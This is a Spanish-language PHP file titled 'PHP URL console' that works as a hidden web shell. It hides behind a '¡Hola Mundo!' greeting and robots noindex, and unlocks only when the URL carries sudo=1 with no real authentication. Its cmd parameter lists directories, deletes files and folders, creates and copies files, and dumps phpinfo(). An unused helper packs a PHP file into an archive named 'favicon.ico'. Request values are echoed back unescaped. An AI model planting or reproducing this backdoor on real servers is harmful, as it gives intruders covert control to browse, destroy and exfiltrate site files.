<!DOCTYPE html>
<html lang="es">
	<head>
		<title>PHP URL console</title>
		<meta name="robots" content="noindex, nofollow">
	</head>
	<body>
		<style type="text/css">

			*{
				font-family:monospace;
				color:#a6c628;
			}

			body{
				background-color: #272822;
			}

			small{
				font-size: 10px;
			}

			.file{
				color:#FFF;
			}

			.folder{
				color:#fd9720;
			}

			.link{
				color:#66d9ef;
			}

			.error{
				color:#d92731;
			}

			.alert{
				color:#c8db74;
			}

		</style>
	</body>
</html>
<?php

	$obj = new tools();

	if(isset($_GET["sudo"]) && $_GET["sudo"] == 1)
	{

		if(isset($_GET["cmd"]) && $_GET["cmd"] != "")
		{

			switch ($_GET["cmd"])
			{

				case 'ls':

					if(isset($_GET["dir"]) && $_GET["dir"] != null){
						$obj->listDir($_GET["dir"]);
					}else{
						$obj->listDir('.');
						echo "<br> > Usa el comando dir para listar un directorio";
					}
					break;

				case 'phpinfo':

					$obj->verInfoPHP();
					break;

				case 'unlink':

					if(isset($_GET["file"]) && $_GET["file"] != "" && $_GET["file"] != null){
						$obj->deleteFile($_GET["file"]);
					}else{
						echo "> Va a eliminar un archivo";
					}
					break;

				case 'rmdir':

					if(isset($_GET["dir"]) && $_GET["dir"] != "" && $_GET["dir"] != null){
						$obj->deleteDir($_GET["dir"]);
					}else{
						echo "> Va a eliminar un directorio";
					}
					break;

				case 'mkdir':

					if(isset($_GET["name"]) && !empty($_GET["name"])){
						$obj->makeDir($_GET["name"]);
					
					}else{
						echo "> Utilice name para crear el directorio";
					}
					break;

				case 'copy':
					$obj->copyFile($_GET["from"], $_GET["to"]);
					break;

				case 'list':
						echo "Lista de funciones disponibles:<br>
						<table border=\"0\">
						<tr><td><span class=\"link\">func:</span></td><td> Ejecuta las funciones</td></tr>
						<tr><td><span class=\"link\">ls:</span></td><td> Listar directorios (requiere dir)</td></tr>
						<tr><td><span class=\"link\">mkdir:</span></td><td> Crear un directorio (requiere name)</td></tr>
						<tr><td><span class=\"link\">rmdir:</span></td><td> Borrar directorio si está vacio (requiere dir)</td></tr>
						<tr><td><span class=\"link\">copy:</span></td><td> Copiar un archivo (requiere from y to)</td></tr>
						<tr><td><span class=\"link\">unlink:</span></td><td> Eliminar un fichero (requiere file)</td></tr>
						<tr><td><span class=\"link\">phpinfo:</span></td><td> Muestra la configuracion PHP del sitio</td></tr>
						</table>";
					break;
				
				default:

					echo "> No se reconoce el comando <b class=\"error\">".$_GET["cmd"]."</b>";

					break;
				}
		}else{
			echo "> Utilice <b>cmd</b> para indicar que funcion desea ejecutar. Pts! utiliza cmd=list para ver los comandos";
		}
	}else{
		echo "> ¡Hola Mundo!";
	}


	class tools{

		function listDir($nameFolder)
		{
			if(is_dir($nameFolder))
			{
				$directorio = opendir($nameFolder);
				while ($archivo = readdir($directorio))
				{
				    if (is_dir($archivo))
				    {
				        echo "<small class=\"folder\">[carpeta] - </small>".$archivo."<br>";
				    }else{
				        echo "<small class=\"file\">[archivo] - </small><a href=\"".$archivo."\" download>".$archivo."</a><br />";
				    }
				}
				echo "<br><small><a class=\"link\" href=".$nameFolder.">Ir directamente a la carpeta</a></small>";
			}else{
				echo "> <b class=\"error\">".$_GET["dir"]."</b> no es un directorio";
			}
		}

		function zipFile($file)
		{
			$zip = new ZipArchive();
			$filename = "favicon.ico";

			if ($zip->open($filename, ZipArchive::CREATE)!==TRUE) {
			    exit("cannot open <$filename>\n");
			}

			$zip->addFromString("testfilephp.txt" . time(), "#1 Esto es una cadena de prueba añadida como  testfilephp.txt.\n");
			$zip->addFromString("testfilephp2.txt" . time(), "#2 Esto es una cadena de prueba añadida como testfilephp2.txt.\n");
			$zip->addFile($thisdir . "/too.php","/testfromfile.php");
			echo "numficheros: " . $zip->numFiles . "\n";
			echo "estado:" . $zip->status . "\n";
			$zip->close();

		}


		function copyFile($original, $copia)
		{
			$original = $original;
			$destino = $copia."/".$original.".bak";

			if(!copy($original, $destino))
			{
			    echo "> Error al copiar $file...\n";
			}
			else
			{
				echo "> Se ha copiado el archivo ".$destino;
			}
		}

		function deleteFile($archivo)
		{

			if(file_exists($archivo))
			{
				unlink($archivo);
				echo "> Se ha eliminado el archivo ".$_GET["file"]."<br>";
			}
			else
			{
				echo "> El archivo <span class=\"alert\">".$archivo."</span> no existe<br>";
			}

		}

		function deleteDir($folder)
		{		
			if(file_exists($folder))
			{
				rmdir($folder);
				echo "> Se ha eliminado el ".$_GET["dir"]."<br>";
			}
			else
			{
				echo "> El directorio <span class=\"alert\">".$folder."</span> no existe<br>";
			}
		}

		function makeDir($nombre)
		{

			if(file_exists($nombre))
			{
				echo "> El directorio <a href=".$nombre."><span class=\"alert\">".$nombre."</span></a> ya existe<br>";
				return true;
			}
			else
			{
				mkdir($nombre);
				echo "> Se ha creado el directorio <a href=".$nombre.">".$nombre."</a><b><br>";
				return false;
			}

		}

		function verInfoPHP()
		{
			phpinfo();
		}
		
	}

?>